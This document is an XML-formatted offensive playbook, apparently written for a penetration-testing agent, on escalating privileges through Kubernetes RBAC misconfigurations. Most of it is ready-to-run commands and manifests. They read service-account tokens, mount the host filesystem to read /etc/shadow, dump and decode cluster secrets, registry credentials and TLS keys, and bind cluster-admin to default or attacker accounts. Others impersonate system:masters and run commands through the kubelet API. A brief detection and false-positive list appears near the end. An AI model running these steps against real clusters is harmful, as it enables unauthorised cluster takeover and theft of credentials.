<vulnerability_guide>
  <title>KUBERNETES RBAC ABUSE AND PRIVILEGE ESCALATION</title>

  <critical>Kubernetes RBAC misconfigurations are the leading cause of cluster compromise. Overly permissive roles, dangerous verb/resource combinations, and service account abuse allow attackers to escalate from a single pod to cluster-admin. Many default configurations and common patterns inadvertently grant excessive privileges.</critical>

  <scope>
    - Service account privilege escalation
    - Role and ClusterRole misconfigurations
    - Dangerous permission combinations
    - Namespace escape via RBAC
    - Token theft and impersonation
    - Secret access for credential extraction
    - Node-level access escalation
  </scope>

  <methodology>
    1. **Enumerate permissions**: List available verbs on all resources
    2. **Identify escalation paths**: Find roles that grant privilege escalation
    3. **Check service accounts**: Analyze SA permissions in accessible namespaces
    4. **Test dangerous combinations**: Try known-dangerous permission pairs
    5. **Extract credentials**: Access secrets and tokens
    6. **Escalate**: Move from limited to cluster-admin access
  </methodology>

  <advanced_techniques>
    <permission_enumeration>
      Discover available permissions:
      {% raw %}
      # Check current permissions
      kubectl auth can-i --list
      kubectl auth can-i --list --namespace=kube-system

      # Check specific permissions
      kubectl auth can-i create pods
      kubectl auth can-i get secrets
      kubectl auth can-i '*' '*'

      # Using SA token directly
      KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
      curl -k -H "Authorization: Bearer $KUBE_TOKEN" \
        https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
        -X POST -H "Content-Type: application/json" \
        -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'

      # List roles and bindings
      kubectl get roles,rolebindings -A
      kubectl get clusterroles,clusterrolebindings

      # Describe specific role
      kubectl describe clusterrole admin
      {% endraw %}
    </permission_enumeration>

    <dangerous_permissions>
      Identify high-risk permission combinations:
      {% raw %}
      # CRITICAL: Direct cluster-admin equivalent
      - create pods
      - create deployments/daemonsets
      - update/patch nodes
      - create clusterrolebindings
      - impersonate users/groups/serviceaccounts

      # HIGH: Lead to escalation
      - get secrets (access tokens, credentials)
      - create/update roles (grant new permissions)
      - update pods/exec (exec into any pod)
      - create serviceaccounts
      - create pods/attach, pods/portforward

      # DANGEROUS COMBINATIONS:
      # Can create pod + mount any secret = get all secrets
      # Can create rolebinding + any role = privilege escalation
      # Can update deployment + any namespace = code injection
      # Can get nodes/proxy = kubelet API access

      # Check for wildcard permissions
      kubectl get clusterrole admin -o yaml | grep -E "\*|''"
      {% endraw %}
    </dangerous_permissions>

    <pod_creation_escalation>
      Escalate via pod creation:
      {% raw %}
      # Mount host filesystem
      apiVersion: v1
      kind: Pod
      metadata:
        name: pwned
      spec:
        containers:
        - name: pwned
          image: alpine
          command: ["/bin/sh", "-c", "cat /host/etc/shadow"]
          volumeMounts:
          - name: host
            mountPath: /host
        volumes:
        - name: host
          hostPath:
            path: /
            type: Directory

      # Use privileged service account
      apiVersion: v1
      kind: Pod
      metadata:
        name: pwned
      spec:
        serviceAccountName: cluster-admin
        automountServiceAccountToken: true
        containers:
        - name: pwned
          image: alpine

      # Run on control plane node
      apiVersion: v1
      kind: Pod
      metadata:
        name: pwned
      spec:
        nodeName: control-plane-node
        tolerations:
        - operator: "Exists"
        hostNetwork: true
        hostPID: true
        containers:
        - name: pwned
          image: alpine
          securityContext:
            privileged: true
      {% endraw %}
    </pod_creation_escalation>

    <secret_extraction>
      Extract credentials from secrets:
      {% raw %}
      # List all secrets
      kubectl get secrets -A

      # Get specific secret
      kubectl get secret admin-token -o yaml
      kubectl get secret admin-token -o jsonpath='{.data.token}' | base64 -d

      # Get all service account tokens
      kubectl get secrets -A -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | .metadata.name'

      # Extract docker registry credentials
      kubectl get secret regcred -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d

      # Get TLS certificates and keys
      kubectl get secret tls-secret -o jsonpath='{.data.tls\.key}' | base64 -d

      # AWS/GCP/Azure credentials in secrets
      kubectl get secrets -A -o json | jq -r '.items[].data | keys[]' | grep -iE "aws|gcp|azure|key|token|password"
      {% endraw %}
    </secret_extraction>

    <rolebinding_escalation>
      Escalate via role binding creation:
      {% raw %}
      # Create binding to existing powerful role
      kubectl create rolebinding pwned --clusterrole=admin --serviceaccount=default:default

      # Create cluster-wide binding
      kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default

      # Bind to user/group
      kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --user=attacker@example.com

      # YAML for custom escalation
      apiVersion: rbac.authorization.k8s.io/v1
      kind: ClusterRoleBinding
      metadata:
        name: escalation
      subjects:
      - kind: ServiceAccount
        name: default
        namespace: default
      roleRef:
        kind: ClusterRole
        name: cluster-admin
        apiGroup: rbac.authorization.k8s.io

      # Check if you can create bindings
      kubectl auth can-i create rolebindings
      kubectl auth can-i create clusterrolebindings
      {% endraw %}
    </rolebinding_escalation>

    <impersonation_attack>
      Abuse user/group impersonation:
      {% raw %}
      # Check impersonation permissions
      kubectl auth can-i impersonate users
      kubectl auth can-i impersonate serviceaccounts
      kubectl auth can-i impersonate groups

      # Impersonate cluster-admin user
      kubectl get pods --as=system:admin
      kubectl get secrets --as=cluster-admin

      # Impersonate service account
      kubectl get pods --as=system:serviceaccount:kube-system:default

      # Impersonate group
      kubectl get pods --as-group=system:masters

      # API call with impersonation
      curl -k -H "Authorization: Bearer $TOKEN" \
        -H "Impersonate-User: cluster-admin" \
        https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets
      {% endraw %}
    </impersonation_attack>

    <node_access_escalation>
      Escalate via node access:
      {% raw %}
      # If you can proxy to nodes
      kubectl proxy &
      curl http://localhost:8001/api/v1/nodes/node-name/proxy/pods

      # Direct kubelet API access
      curl -k https://node-ip:10250/pods
      curl -k https://node-ip:10250/run/namespace/pod/container -d "cmd=id"

      # Access node resources
      kubectl debug node/node-name -it --image=alpine

      # Exec to pod on target node, then escape
      kubectl exec -it pod-on-target-node -- /bin/sh
      # Then use container escape techniques

      # If can update node labels
      kubectl label node node-name kubernetes.io/role=master
      # May allow scheduling on control plane
      {% endraw %}
    </node_access_escalation>

    <namespace_escape>
      Escape namespace restrictions:
      {% raw %}
      # If you have permissions in one namespace but need another

      # Check cross-namespace access
      kubectl auth can-i get pods -n kube-system

      # Create pod that mounts secrets from other namespaces
      # Requires appropriate SA permissions
      apiVersion: v1
      kind: Pod
      metadata:
        name: cross-ns
      spec:
        containers:
        - name: pwned
          image: alpine
          volumeMounts:
          - name: secret
            mountPath: /secret
        volumes:
        - name: secret
          projected:
            sources:
            - serviceAccountToken:
                path: token
                expirationSeconds: 3600
                audience: kube-system

      # If you can create resources in kube-system
      kubectl create deployment pwned -n kube-system --image=alpine
      {% endraw %}
    </namespace_escape>

    <common_misconfigurations>
      Exploit common RBAC mistakes:
      {% raw %}
      # Default service account with excessive permissions
      kubectl get rolebindings,clusterrolebindings -A -o json | \
        jq '.items[] | select(.subjects[]?.name=="default")'

      # system:authenticated group with broad access
      kubectl get clusterrolebindings -o json | \
        jq '.items[] | select(.subjects[]?.name=="system:authenticated")'

      # Wildcard permissions in roles
      kubectl get clusterroles -o json | \
        jq '.items[] | select(.rules[].verbs[] | contains("*"))'

      # Roles allowing self-escalation
      kubectl get clusterroles -o json | \
        jq '.items[] | select(.rules[].resources[] | contains("clusterrolebindings"))'

      # Overly permissive admission controllers (or lack thereof)
      kubectl get pods -n kube-system | grep admission
      {% endraw %}
    </common_misconfigurations>
  </advanced_techniques>

  <validation>
    - Escalate from limited service account to cluster-admin
    - Extract secrets containing credentials or tokens
    - Create privileged pod with host access
    - Demonstrate cross-namespace access via RBAC abuse
    - Document escalation path from initial foothold
  </validation>

  <false_positives>
    - Legitimate admin service accounts
    - CI/CD accounts with intentionally broad permissions
    - Monitoring/observability tools requiring cluster-wide read access
    - Operators and controllers with their required permissions
  </false_positives>

  <detection_indicators>
    - Creation of new ClusterRoleBindings
    - Access to secrets in kube-system or other sensitive namespaces
    - Impersonation header usage
    - Pod creation with hostPath mounts or privileged security context
    - Self-subject access reviews (permission enumeration)
  </detection_indicators>

  <pro_tips>
    - Always check what default service accounts can do
    - system:authenticated often has more permissions than expected
    - Pod creation permission is effectively cluster-admin
    - Look for service accounts with excessive permissions across namespaces
    - Many operators create overly permissive roles
    - Check if PSP/PSA is enforced - affects pod-based escalation
    - Aggregated ClusterRoles (admin, edit, view) may have unexpected permissions
    - Token projection can be used for cross-namespace access
  </pro_tips>

  <remember>In Kubernetes, the ability to create pods, modify roles, or access secrets often leads directly to cluster compromise. RBAC misconfigurations compound - a single overly-permissive role can undermine the entire security model.</remember>
</vulnerability_guide>
